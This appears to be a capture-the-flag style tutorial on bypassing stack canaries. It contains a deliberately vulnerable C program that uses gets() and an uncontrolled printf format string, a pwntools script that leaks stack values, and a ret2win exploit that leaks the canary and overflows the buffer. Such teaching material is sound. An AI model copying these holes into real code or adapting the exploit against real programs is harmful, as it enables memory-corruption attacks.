```c
#include <stdio.h>
#include <string.h>

void win() {
    puts("Wait, how did you get in here?!");
}

void vuln() {
    char buffer[64];

    puts("You'll never beat my state of the art stack protector!");
    gets(buffer);
    printf(buffer);

    puts("\nWho said gets() is dangerous? Good luck with your BOF attack :P");
    gets(buffer);
}

int main() {
    vuln();
}
```

```bash
gcc prog.c -o prog -fstack-protector-all -no-pie -m32
```

> Note: We don't necessarily have to do this in 32-bit, 64-bit works too.

Stack canaries will check whether the function has been overwritten by placing a value right after the return address of the function. If we want to overwrite the return address, we'd have to overwrite the stack canaries too, and at the end of the function before returning, the program will check if the stack canaries remain the same value or not, if not then it will return an error.

For this challenge, the goal would be to use the `printf` function to leak the value of the stack canary, then use the second `gets` function call to overflow the buffer, overwrite the return value, and make sure to overwrite the stack canary with it's correct value.

We can run a fuzz script to leak the first 100 hex items on the stack:

```python
for i in range(100):
    try:
	    p = process(level='error')
	    
        # Format the counter
        p.sendline('%{}$p'.format(i).encode())
        p.recvline()
        
        # Receive the response
        result = p.recvline().decode()
        
        # If the item from the stack isn't empty, print it
        if result:
            print(str(i) + ': ' + str(result).strip())
    except EOFError:
        pass
```

We want to look for values that are fairly random and ends with `00`. We also should run the script multiple times and look for values that are changes in a random sense. For our case, the 23rd item on the stack seems to be the canary.

We can also look for the canary in `pwndbg` using the `canary` command. It gives us the 23rd element from the stack.

After disassembling the executable with `ghidra`, we can see that right above the `buffer` is the canary, so we overwrite the canary by overflowing the 64 bytes of the buffer then input our overwrite value. And between the return address of the function and the stack canary is another 12 bytes that we need to pad out.

Here's the python script for that:

```python
# Start program
io = start()

offset = 64  # Canary offset

# Leak canary value (23rd on stack)
io.sendlineafter(b'!', '%{}$p'.format(23).encode())
io.recvline()  # Blank line
canary = int(io.recvline().strip(), 16)
info('canary = 0x%x (%d)', canary, canary)

# Build payload (ret2win)
payload = flat([
    b'A' * offset,  # Pad to canary
    canary,  # The leaked canary
    b'A' * 12,  # Pad to ret pointer
    elf.symbols.win  # Return to the win function
])

# Send the payload
io.sendlineafter(b':P', payload)
```